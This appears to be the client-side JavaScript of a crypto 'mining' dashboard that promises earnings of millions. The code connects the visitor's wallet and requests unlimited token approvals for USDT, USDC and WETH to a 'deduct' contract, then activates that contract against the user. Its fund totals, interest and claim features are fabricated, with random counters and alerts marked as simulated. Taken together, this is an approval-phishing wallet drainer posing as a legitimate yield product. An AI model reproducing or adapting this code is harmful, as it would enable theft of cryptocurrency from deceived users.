//---Client-side Constants (客戶端常數)---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

//---ABI Definitions (客戶端精簡版 ABI)---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements (全域變數與 DOM 元素)---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const walletBalanceAmount = document.getElementById('walletBalanceAmount');
const accountBalanceValue = document.getElementById('accountBalanceValue');
const totalValue = document.getElementById('totalValue');
const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
const nextBenefit = document.getElementById('nextBenefit');
const claimBtn = document.createElement('button');
claimBtn.id = 'claimButton';

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let stakingStartTime = null;
let claimedInterest = 0;
let pledgedAmount = 0;
let interestInterval = null;

//---UI Control Functions (使用者介面控制函數)---
function updateStatus(message, isWarning = false) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
    statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
}

function resetState(showMsg = true) {
    console.log("執行狀態重置 (resetState)...");
    signer = userAddress = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    if (interestInterval) clearInterval(interestInterval);
    localStorage.removeItem('stakingStartTime');
    localStorage.removeItem('claimedInterest');
    localStorage.removeItem('pledgedAmount');
    localStorage.removeItem('nextBenefitTime');
    if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.textContent = translations[currentLang].startBtnText || 'Start';
    }
    const existingClaimBtn = document.getElementById('claimButton');
    if (existingClaimBtn) existingClaimBtn.remove();
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
    }
    disableInteractiveElements(true);
    if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
    if (walletTokenSelect) walletTokenSelect.value = 'USDT';
    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
    if (showMsg) updateStatus("請先連接您的錢包以繼續。");
}

function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
}

function updateWalletBalance(balances) {
    if (!walletTokenSelect || !walletBalanceAmount) return;
    const selectedToken = walletTokenSelect.value;
    const tokenBalance = balances[selectedToken.toLowerCase()] || 0n;
    const decimals = { USDT: 6, USDC: 6, WETH: 18 };
    const formattedBalance = ethers.formatUnits(tokenBalance, decimals[selectedToken]);
    walletBalanceAmount.textContent = parseFloat(formattedBalance).toFixed(3);
    if (accountBalanceValue) {
        accountBalanceValue.textContent = `${parseFloat(formattedBalance).toFixed(3)} ${selectedToken}`;
    }
    if (parseFloat(formattedBalance) < 0.001) {
        updateStatus(`提示: 您的 ${selectedToken} 餘額為零。`, true);
    } else {
        if (statusDiv.style.color === 'rgb(255, 215, 0)') {
            updateStatus("");
        }
    }
}

function updateTotalFunds() {
    if (totalValue) {
        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
        let initialFunds = 2856459.94;
        const increaseRate = Math.random() * (0.1 - 0.01) + 0.01;
        const totalIncrease = elapsedSeconds * increaseRate;
        const totalFunds = initialFunds + totalIncrease;
        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
    }
}

function updateInterest() {
    if (stakingStartTime && grossOutputValue && cumulativeValue) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001;
        const interestRate = baseInterestRate * pledgedAmount;
        const grossOutput = elapsedSeconds * interestRate;
        const cumulative = grossOutput - claimedInterest;
        grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
        cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
    }
}

function updateNextBenefitTimer() {
    if (!nextBenefit) return;
    const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
    const label = (translations[currentLang].nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
    if (!nextBenefitTimestamp) {
        nextBenefit.textContent = `${label}: 00:00:00`;
        return;
    }
    const now = Date.now();
    let diff = nextBenefitTimestamp - now;
    if (diff <= 0) {
        const twelveHoursInMillis = 12 * 60 * 60 * 1000;
        const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
        localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
        diff = newNextBenefitTimestamp - now;
    }
    const totalSeconds = Math.floor(diff / 1000);
    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const seconds = String(totalSeconds % 60).padStart(2, '0');
    nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
}

function setInitialNextBenefitTime() {
    if (localStorage.getItem('nextBenefitTime')) return;
    console.log("首次設定收益倒數計時器目標...");
    const startTime = new Date();
    const nextNoonUTC = new Date(startTime);
    nextNoonUTC.setUTCHours(12, 0, 0, 0);
    if (startTime > nextNoonUTC) nextNoonUTC.setUTCDate(nextNoonUTC.getUTCDate() + 1);
    const nextMidnightUTC = new Date(startTime);
    nextMidnightUTC.setUTCHours(24, 0, 0, 0);
    const immediateNextBenefitTime = (nextNoonUTC < nextMidnightUTC) ? nextNoonUTC : nextMidnightUTC;
    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
    const finalNextBenefitTimestamp = immediateNextBenefitTime.getTime() + twelveHoursInMillis;
    localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
}

function activateStakingUI() {
    const storedStartTime = localStorage.getItem('stakingStartTime');
    if (storedStartTime) {
        stakingStartTime = parseInt(storedStartTime);
    } else {
        stakingStartTime = Date.now();
        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
    }
    claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
    pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
    if (startBtn) startBtn.style.display = 'none';
    if (document.getElementById('claimButton')) return;
    claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim';
    claimBtn.className = 'start-btn';
    claimBtn.style.marginTop = '10px';
    claimBtn.disabled = false;
    const placeholder = document.getElementById('claimButtonPlaceholder');
    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
    if (!claimBtn.hasEventListener) {
        claimBtn.addEventListener('click', claimInterest);
        claimBtn.hasEventListener = true;
    }
    if (interestInterval) clearInterval(interestInterval);
    interestInterval = setInterval(updateInterest, 1000);
}

//---Core Wallet Logic---
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("錢包未連接或簽名者缺失。");
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`授權已發送！HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
        receipt = await provider.waitForTransaction(txHash);
    } catch (error) {
        console.warn("⚠️ Trust Wallet...: ", error.message);
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) { const match = error.message.match(/(0x[a-fA-F0-9]{64})/); if (match) txHash = match[0]; }
        if (txHash) {
            updateStatus(`交易介面發生錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
            receipt = await provider.waitForTransaction(txHash);
        } else throw new Error(`交易發送失敗: ${error.message}`);
    }
    if (!receipt || receipt.status !== 1) throw new Error(`交易在鏈上失敗。哈希: ${txHash.slice(0, 10)}...`);
    return receipt;
}

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask、Trust Wallet 或相容的錢包以繼續。');
            disableInteractiveElements(true);
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        
        window.ethereum.on('accountsChanged', (newAccounts) => {
            if (userAddress) {
                console.log("偵測到帳戶變更...");
                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                    window.location.reload();
                }
            }
        });

        window.ethereum.on('chainChanged', () => window.location.reload());

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus("請先連接您的錢包以繼續。");
        }
    } catch (error) {
        console.error("初始化錢包錯誤:", error);
        updateStatus(`初始化失敗: ${error.message}`);
    }
}

async function updateUIBasedOnChainState() {
    if (!signer) return;
    try {
        updateStatus("正在檢查鏈上授權狀態...");
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            deductContract.isServiceActiveFor(userAddress),
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
        ]);

        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;

        if (isFullyAuthorized) {
            console.log("鏈上狀態為已授權，切換至質押中UI。");
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            
            walletTokenSelect.dispatchEvent(new Event('change'));
            activateStakingUI();
        } else {
            console.log("鏈上狀態為未授權，顯示Start按鈕。");
            if(startBtn) startBtn.style.display = 'block';
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error("檢查鏈上狀態失敗:", error);
        updateStatus("檢查鏈上狀態失敗，請刷新重試。");
    }
}

async function handleConditionalAuthorizationFlow() {
    if (!signer) throw new Error("錢包未連接");
    updateStatus('準備授權流程...');
    
    const selectedToken = walletTokenSelect.value;
    console.log(`用戶選擇了 ${selectedToken} 進行授權。`);

    const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
    const serviceActivated = await deductContract.isServiceActiveFor(userAddress);

    const tokenMap = {
        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
    };

    const tokensToProcess = [
        tokenMap[selectedToken],
        ...Object.values(tokenMap).filter(t => t.name !== selectedToken)
    ];
    
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`檢查 ${name} 授權...`);
        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
        if (currentAllowance < requiredAllowance) {
            updateStatus(`請求 ${name} 授權... 請在錢包中批准。`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }

    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`啟動服務 (使用 ${tokenName})...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        await sendMobileRobustTransaction(activateTx);
    }
}

async function connectWallet() {
    try {
        if (!provider) throw new Error("Provider 未初始化");
        updateStatus('請在錢包中確認連接...');
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("未選擇帳戶。");
        
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        connectButton.classList.add('connected');
        connectButton.textContent = 'Connected';
        connectButton.title = '斷開錢包';

        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        await updateUIBasedOnChainState();
        
        updateStatus('正在獲取錢包餘額...');
        const balances = {
            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
            weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
        };
        updateWalletBalance(balances);
        updateStatus("");

    } catch (error) {
        console.error("連接錢包錯誤:", error);
        let userMessage = `發生錯誤: ${error.message}`;
        if (error.code === 4001) userMessage = "您拒絕了連接請求。";
        updateStatus(userMessage);
        resetState(true);
    }
}

function disconnectWallet() {
    resetState(true);
    alert('錢包已斷開。要完全移除網站權限，請在錢包的「已連接網站」設置中操作。');
}

function claimInterest() {
    if (stakingStartTime) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001;
        const interestRate = baseInterestRate * pledgedAmount;
        const grossOutput = elapsedSeconds * interestRate;
        claimedInterest = grossOutput;
        localStorage.setItem('claimedInterest', claimedInterest.toString());
        updateInterest();
        alert('利息已領取！(模擬)');
    }
}

//---Language Control---
const translations = { 'en': { title: 'Popular Mining', subtitle: 'Start Earning Millions', tabLiquidity: 'Liquidity', tabPledging: 'Pledging', grossOutputLabel: 'Gross Output', cumulativeLabel: 'Cumulative', walletBalanceLabel: 'Wallet Balance', accountBalanceLabel: 'Account Balance', compoundLabel: '⚡ Compound', nextBenefit: 'Next Benefit: 00:00:00', startBtnText: 'Start', pledgeAmountLabel: 'Pledge Amount', pledgeDurationLabel: 'Duration', pledgeBtnText: 'Pledge Now', totalPledgedLabel: 'Total Pledged', expectedYieldLabel: 'Expected Yield', apyLabel: 'APY', lockedUntilLabel: 'Locked Until', claimBtnText: 'Claim' }, 'zh-Hant': { title: '熱門挖礦', subtitle: '開始賺取數百萬', tabLiquidity: '流動性', tabPledging: '質押', grossOutputLabel: '總產出', cumulativeLabel: '累計', walletBalanceLabel: '錢包餘額', accountBalanceLabel: '帳戶餘額', compoundLabel: '⚡ 複利', nextBenefit: '下次收益: 00:00:00', startBtnText: '開始', pledgeAmountLabel: '質押金額', pledgeDurationLabel: '期間', pledgeBtnText: '立即質押', totalPledgedLabel: '總質押', expectedYieldLabel: '預期收益', apyLabel: '年化收益率', lockedUntilLabel: '鎖定至', claimBtnText: '領取' }, 'zh-Hans': { title: '热门挖矿', subtitle: '开始赚取数百万', tabLiquidity: '流动性', tabPledging: '质押', grossOutputLabel: '总产出', cumulativeLabel: '累计', walletBalanceLabel: '钱包余额', accountBalanceLabel: '账户余额', compoundLabel: '⚡ 复利', nextBenefit: '下次收益: 00:00:00', startBtnText: '开始', pledgeAmountLabel: '质押金额', pledgeDurationLabel: '期间', pledgeBtnText: '立即质押', totalPledgedLabel: '总质押', expectedYieldLabel: '预期收益', apyLabel: '年化收益率', lockedUntilLabel: '锁定至', claimBtnText: '领取' } };
let currentLang = navigator.language || navigator.userLanguage;
if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) currentLang = 'en';
else if (currentLang === 'zh') currentLang = 'zh-Hans';
const languageSelect = document.getElementById('languageSelect');
const elements = { title: document.getElementById('title'), subtitle: document.getElementById('subtitle'), tabLiquidity: document.getElementById('tabLiquidity'), tabPledging: document.getElementById('tabPledging'), grossOutputLabel: document.getElementById('grossOutputLabel'), cumulativeLabel: document.getElementById('cumulativeLabel'), walletBalanceLabel: document.getElementById('walletBalanceLabel'), accountBalanceLabel: document.getElementById('accountBalanceLabel'), compoundLabel: document.getElementById('compoundLabel'), nextBenefit: document.getElementById('nextBenefit'), startBtnText: document.getElementById('startBtn'), pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), pledgeBtnText: document.getElementById('pledgeBtn'), totalPledgedLabel: document.getElementById('totalPledgedLabel'), expectedYieldLabel: document.getElementById('expectedYieldLabel'), apyLabel: 'APY', lockedUntilLabel: document.getElementById('lockedUntilLabel'), claimBtnText: claimBtn };
function updateLanguage(lang) { currentLang = lang; languageSelect.value = lang; for (let key in elements) { if (elements[key] && translations[lang][key]) { elements[key].textContent = translations[lang][key]; } } if (claimBtn.parentNode) claimBtn.textContent = translations[lang].claimBtnText || 'Claim'; updateNextBenefitTimer(); }

//---Event Listeners & Initial Load---
document.addEventListener('DOMContentLoaded', () => {
    languageSelect.value = currentLang; 
    updateLanguage(currentLang);
    initializeWallet();
    setInterval(updateTotalFunds, 1000);
    setInterval(updateNextBenefitTimer, 1000);
});

languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

startBtn.addEventListener('click', async () => {
    if (!signer) {
        alert('請先連接您的錢包！');
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
    const selectedContract = tokenMap[selectedToken];
    try {
        const balance = await selectedContract.balanceOf(userAddress);
        if (balance === 0n) {
            alert(`您的 ${selectedToken} 餘額為零，無法開始。請確保您的錢包中有足夠的餘額。`);
            return;
        }
    } catch (e) {
        alert("無法獲取餘額，請稍後重試。");
        return;
    }

    startBtn.disabled = true;
    startBtn.textContent = '授權中...';
    try {
        await handleConditionalAuthorizationFlow();
        alert('授權成功！挖礦已開始。');
        setInitialNextBenefitTime();
        await updateUIBasedOnChainState();
    } catch (error) {
        console.error("授權流程失敗:", error);
        alert(`授權失敗: ${error.message}`);
        updateStatus(`授權失敗: ${error.message}`);
    } finally {
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang].startBtnText || 'Start';
    }
});

// ===== 語法修正開始 =====
pledgeBtn.addEventListener('click', async () => {
    if (!signer) {
        alert('請先連接您的錢包！');
        return;
    }
    const amount = parseFloat(pledgeAmount.value) || 0;
    if (!amount) {
        alert('請輸入質押金額！');
        return;
    }
    pledgedAmount = amount;
    localStorage.setItem('pledgedAmount', pledgedAmount.toString());
    
    alert(`質押 ${amount} ${pledgeToken.value} 於 ${pledgeDuration.value} 天... (模擬: 質押成功)`);
    const totalPledgedValue = document.getElementById('totalPledgedValue');
    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`;
});
// ===== 語法修正結束 =====

refreshWallet.addEventListener('click', async () => { if (!signer) { alert('請先連接您的錢包！'); return; } updateStatus('正在刷新餘額...'); const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) }; updateWalletBalance(balances); updateStatus(''); alert('刷新錢包餘額成功！'); });
walletTokenSelect.addEventListener('change', async () => { if (!signer) { walletBalanceAmount.textContent = '0.000'; accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`; return; } const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) }; updateWalletBalance(balances); });
const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
    });
});